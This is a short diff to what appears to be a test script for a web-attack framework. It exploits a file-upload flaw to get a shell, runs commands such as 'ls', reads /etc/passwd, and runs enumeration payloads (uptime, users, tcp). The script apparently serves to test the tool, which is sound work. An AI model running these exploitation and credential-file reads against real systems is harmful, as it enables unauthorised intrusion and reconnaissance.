@@ -24,8 +24,14 @@ assert len( kb.kb.getData('fileUpload', 'fileUpload') ) == 1
 exploit
 exploit fileUploadShell
 interact 0
-w
-ls
+
+execute w
+execute ls
+read /etc/passwd
+payload uptime
+payload users
+payload tcp
+
 endInteraction
 
 back
